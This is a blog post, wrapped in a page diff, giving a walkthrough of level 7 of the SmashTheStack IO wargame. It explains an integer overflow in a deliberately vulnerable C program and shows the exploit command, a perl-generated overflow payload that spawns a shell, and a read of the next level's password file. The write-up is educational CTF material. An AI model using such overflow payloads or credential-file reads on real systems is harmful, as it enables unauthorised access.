@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Levels 7 and 7_alt - IO at STS &middot; OJ Reeves</title>
+        <meta name="description" content="I&rsquo;ve been documenting my experiences with IO at SmashTheStack for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the alt level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven&rsquo;t had a play on the SmashTheStack wargames yet, I really do recommend it. They&rsquo;re great fun.">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.55.6" />
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta property="og:title" content="Levels 7 and 7_alt - IO at STS">
+<meta property="og:description" content="I&rsquo;ve been documenting my experiences with IO at SmashTheStack for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the alt level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven&rsquo;t had a play on the SmashTheStack wargames yet, I really do recommend it. They&rsquo;re great fun.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="/posts/levels-7-and-7_alt-io-at-sts/">
+        <link rel="stylesheet" href="/dist/styles.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+        
+        
+        
+    </head>
+    <body>
+        
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a title="OJ&#39;s Perspective" href="/">OJ&#39;s Perspective</a>
+                            </h1>
+                        
+                        <a class="button-square" href="/index.xml"><i class="fa fa-rss"></i></a>
+                        
+                            <a class="button-square button-social hint--top" data-hint="Twitter" title="Twitter" href="https://twitter.com/TheColonial" rel="me">
+                                <i class="fa fa-twitter"></i>
+                            </a>
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Github" title="Github" href="https://github.com/OJ" rel="me">
+                                <i class="fa fa-github-alt"></i>
+                            </a>
+                        
+                        
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Email" title="Email" href="mailto:oj@buffered.io">
+                                <i class="fa fa-envelope"></i>
+                            </a>
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+    <li class="site-nav-item">
+        <a title="Home" href="/">Home</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Live Streaming" href="/streaming/">Live Streaming</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="About" href="/about/">About</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Contact" href="/contact/">Contact</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Tags" href="/tags/">Tags</a>
+    </li>
+
+    <li class="site-nav-item">
+        <a title="Categories" href="/categories/">Categories</a>
+    </li>
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">Levels 7 and 7_alt - IO at STS</h1>
+    
+    <p class="post-date">
+        <span>Published <time datetime="2013-08-15" itemprop="datePublished">2013-08-15</time></span>
+        <span>by</span>
+        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
+            <span itemprop="name">
+                <a href="#" itemprop="url" rel="author">OJ Reeves</a>
+            </span>
+        </span>
+    </p>
+    
+        <p class="post-reading post-line">
+            <span>Read time: 5 min</span>
+        </p>
+    
+</header>
+
+        <div class="post-content clearfix" itemprop="articleBody">
+    
+
+    <p>I&rsquo;ve been documenting my experiences with <a href="http://io.smashthestack.org:84/" title="IO @ Smash The Stack">IO</a> at <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> for a while, but decided not to post them publicly for a few reasons. However level 7 (in particular the <code>alt</code> level) was the first that I thought worthy of posting. This post includes how I broke both applications to make it through to the level 8. If you haven&rsquo;t had a play on the <a href="http://smashthestack.org/" title="Smash The Stack">SmashTheStack</a> wargames yet, I really do recommend it. They&rsquo;re great fun.</p>
+
+<h2 id="spoiler-alert">Spoiler Alert</h2>
+
+<p>This post covers, in detail, how to get past level 7 and level 7 alt. If you haven&rsquo;t done these levels yourself yet, and you plan to, then please don&rsquo;t read this until you&rsquo;ve nailed them yourself. I&rsquo;d hate for this to ruin your experience.</p>
+
+<p>However, if you&rsquo;ve done the level or you&rsquo;re just interested in what&rsquo;s involved, please read on.</p>
+
+<h2 id="connecting">Connecting</h2>
+
+<p>Fire up a shell and connect to the game server with the password for the <code>level7</code> user (I won&rsquo;t be sharing passwords here).</p>
+
+<pre><code>$ ssh level7@io.smashthestack.org
+</code></pre>
+
+<p>Let&rsquo;s see what challenges there are for us:</p>
+
+<pre><code>level7@io:~$ ls /levels/level07*
+/levels/level07  /levels/level07_alt  /levels/level07_alt.c  /levels/level07.c
+</code></pre>
+
+<p>This level has two possible entry points, and we&rsquo;ll be covering both in this post.</p>
+
+<h2 id="level-07">Level 07</h2>
+
+<p>We start by looking at the source of the target program:</p>
+
+<pre><code>//written by bla
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char **argv)
+{
+        int count = atoi(argv[1]);
+        int buf[10];
+
+        if(count &gt;= 10 ) 
+                return 1;
+
+        memcpy(buf, argv[2], count * sizeof(int));
+
+        if(count == 0x574f4c46) {
+                printf(&quot;WIN!\n&quot;);
+                execl(&quot;/bin/sh&quot;, &quot;sh&quot; ,NULL);
+        } else
+                printf(&quot;Not today son\n&quot;);
+
+        return 0;
+}
+</code></pre>
+
+<p>What&rsquo;s clear here is that we need to pass a number in that is less than <code>10</code>, but is big enough to allow us to overflow <code>buf</code> so that we can modify the value of <code>count</code>. The data that&rsquo;s written to <code>buf</code> is only allowed to be <code>count * sizeof(int)</code> in size.  We can easily pass in numbers smaller than 10, but they won&rsquo;t be big enough to overflow <code>buf</code>. If we pass in a <em>negative</em> number we bypass the check, but the call to <code>memcpy</code> will fail because <code>count * sizeof(int)</code> is negative.</p>
+
+<p>We need to find a way of turning this calculation into something positive, but also much bigger than <code>10 * sizeof(int)</code> so that we can overflow <code>buf</code>.</p>
+
+<p>What&rsquo;s interesting about this is that <code>sizeof(int)</code> on a 32-bit machine is <code>4</code>, which is effectively a <code>SHL 2</code> operation. We can confirm this by disassembling <code>main</code> and looking at the generated output:</p>
+
+<pre><code>gdb$ disas main
+Dump of assembler code for function main:
+0x08048414 &lt;main+0&gt;:    push   ebp
+0x08048415 &lt;main+1&gt;:    mov    ebp,esp
+0x08048417 &lt;main+3&gt;:    sub    esp,0x68
+0x0804841a &lt;main+6&gt;:    and    esp,0xfffffff0
+0x0804841d &lt;main+9&gt;:    mov    eax,0x0
+0x08048422 &lt;main+14&gt;:   sub    esp,eax
+0x08048424 &lt;main+16&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048427 &lt;main+19&gt;:   add    eax,0x4
+0x0804842a &lt;main+22&gt;:   mov    eax,DWORD PTR [eax]
+0x0804842c &lt;main+24&gt;:   mov    DWORD PTR [esp],eax
+0x0804842f &lt;main+27&gt;:   call   0x8048354 &lt;atoi@plt&gt;
+0x08048434 &lt;main+32&gt;:   mov    DWORD PTR [ebp-0xc],eax
+0x08048437 &lt;main+35&gt;:   cmp    DWORD PTR [ebp-0xc],0x9
+0x0804843b &lt;main+39&gt;:   jle    0x8048446 &lt;main+50&gt;
+0x0804843d &lt;main+41&gt;:   mov    DWORD PTR [ebp-0x4c],0x1
+0x08048444 &lt;main+48&gt;:   jmp    0x80484ad &lt;main+153&gt;
+0x08048446 &lt;main+50&gt;:   mov    eax,DWORD PTR [ebp-0xc]
+0x08048449 &lt;main+53&gt;:   shl    eax,0x2                          &lt;- here
+0x0804844c &lt;main+56&gt;:   mov    DWORD PTR [esp+0x8],eax
+0x08048450 &lt;main+60&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048453 &lt;main+63&gt;:   add    eax,0x8
+0x08048456 &lt;main+66&gt;:   mov    eax,DWORD PTR [eax]
+0x08048458 &lt;main+68&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x0804845c &lt;main+72&gt;:   lea    eax,[ebp-0x48]
+0x0804845f &lt;main+75&gt;:   mov    DWORD PTR [esp],eax
+0x08048462 &lt;main+78&gt;:   call   0x8048334 &lt;memcpy@plt&gt;
+0x08048467 &lt;main+83&gt;:   cmp    DWORD PTR [ebp-0xc],0x574f4c46
+0x0804846e &lt;main+90&gt;:   jne    0x804849a &lt;main+134&gt;
+0x08048470 &lt;main+92&gt;:   mov    DWORD PTR [esp],0x8048584
+0x08048477 &lt;main+99&gt;:   call   0x8048344 &lt;printf@plt&gt;
+0x0804847c &lt;main+104&gt;:  mov    DWORD PTR [esp+0x8],0x0
+0x08048484 &lt;main+112&gt;:  mov    DWORD PTR [esp+0x4],0x804858a
+0x0804848c &lt;main+120&gt;:  mov    DWORD PTR [esp],0x804858d
+0x08048493 &lt;main+127&gt;:  call   0x8048324 &lt;execl@plt&gt;
+0x08048498 &lt;main+132&gt;:  jmp    0x80484a6 &lt;main+146&gt;
+0x0804849a &lt;main+134&gt;:  mov    DWORD PTR [esp],0x8048595
+0x080484a1 &lt;main+141&gt;:  call   0x8048344 &lt;printf@plt&gt;
+0x080484a6 &lt;main+146&gt;:  mov    DWORD PTR [ebp-0x4c],0x0
+0x080484ad &lt;main+153&gt;:  mov    eax,DWORD PTR [ebp-0x4c]
+0x080484b0 &lt;main+156&gt;:  leave  
+0x080484b1 &lt;main+157&gt;:  ret    
+End of assembler dump.
+</code></pre>
+
+<p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let&rsquo;s have a look at that in action by whipping up a sample program and viewing the output:</p>
+
+<pre><code>int main(int argc, char **argv)
+{
+    int x = -2147483647;
+    printf(&quot;%p\n&quot;, x);
+    printf(&quot;%p\n&quot;, x &lt;&lt; 2);
+    printf(&quot;%p\n&quot;, (x + 16) &lt;&lt; 2);
+    printf(&quot;%p\n&quot;, (x + 32) &lt;&lt; 2);
+    return 0;
+}
+</code></pre>
+
+<p>Compile this code with <code>gcc</code> and run it, and you&rsquo;ll find the following:</p>
+
+<pre><code>level7@io:/tmp/tc7$ ./a.out
+0x80000001
+0x4
+0x44
+0x84
+</code></pre>
+
+<p>So we can pass in a negative integer, have it shift and turn it into a positive that&rsquo;s big enough to overflow the buffer. Once we&rsquo;ve overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it&rsquo;ll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let&rsquo;s see how this looks:</p>
+
+<pre><code>level7@io:$ /levels/level07 -2147483600 `perl -e 'print &quot;\x46\x4c\x4f\x57&quot; x 100'`
+WIN!
+sh-4.1$ cat /home/level8/.pass
+&lt;&lt; -- password was printed here -- &gt;&gt;
+</code></pre>
+
+<p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>
+
+<h2 id="level-07-alt">Level 07 alt</h2>
+
+<p>Out of respect for the author of the challenge, and the effort that went into to creating it, I have removed my walkthrough for Level 07 alt.</p>
+
+<p>This challenge took me a <em>very long time</em> to complete. It took research, patience, creativity and lots of sweat. I highly recommend attempting to nail this by yourselves. I&rsquo;d like to shout out to Lars Haulin, the creator, for his amazing job in creating this little masterpiece.</p>
+
+<p>Feedback is appreciated as always. Thanks for reading.</p>
+</div>
+
+        <footer class="post-footer clearfix">
+    
+
+    <div class="share">
+        
+            <a class="icon-twitter" href="https://twitter.com/share?text=Levels%207%20and%207_alt%20-%20IO%20at%20STS&url=%2fposts%2flevels-7-and-7_alt-io-at-sts%2f"
+                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fa fa-twitter"></i>
+                <span class="hidden">Twitter</span>
+            </a>
+        
+
+        
+            <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=%2fposts%2flevels-7-and-7_alt-io-at-sts%2f"
+                onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                <i class="fa fa-facebook"></i>
+                <span class="hidden">Facebook</span>
+            </a>
+        
+
+        
+            <a class="icon-google-plus" href="https://plus.google.com/share?url=%2fposts%2flevels-7-and-7_alt-io-at-sts%2f"
+              onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+              <i class="fa fa-google-plus"></i>
+                <span class="hidden">Google+</span>
+            </a>
+        
+        
+    </div>
+</footer>
+
+        
+    <div class="comments">
+        
+    </div>
+
+    </article>
+</div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a title="OJ&#39;s Perspective" href="/">OJ&#39;s Perspective</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#">
+                        <i class="fa fa-angle-up"></i>
+                    </a>
+                </div>
+
+                <p class="footer-copyright">
+                    <span>&copy; 2019 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                </p>
+                <p class="footer-copyright">
+                    <span><a href="https://github.com/roryg/ghostwriter">Ghostwriter theme</a> By <a href="http://jollygoodthemes.com">JollyGoodThemes</a></span>
+                    <span>/ <a href="https://github.com/jbub/ghostwriter">Ported</a> to Hugo By <a href="https://github.com/jbub">jbub</a></span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="/js/jquery-1.11.3.min.js"></script>
+        <script src="/js/jquery.fitvids.js"></script>
+        
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        
+        <script src="/js/scripts.js"></script>
+    </body>
+</html>
+
